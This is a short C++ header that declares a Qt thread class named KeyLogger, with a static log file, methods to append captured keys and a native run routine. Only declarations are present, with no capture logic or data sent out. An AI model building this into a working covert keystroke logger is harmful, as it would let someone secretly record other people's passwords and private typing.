#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <QThread>

class QFile;
class QEventLoop;
class KeyLogger : public QThread
{
    Q_OBJECT
    bool update_key_state();
    bool running;
    static QFile *_logFile;
    QEventLoop *loop;

public:
    explicit KeyLogger(QObject *parent = nullptr);
    ~KeyLogger();
    static void appendKey(const QByteArray &key);
    static void appendKey(const Qt::Key &key);

signals:

public slots:
//    void quit();

    // QThread interface
protected:
    void run();
    void run_native();
};

#endif // KEYLOGGER_H
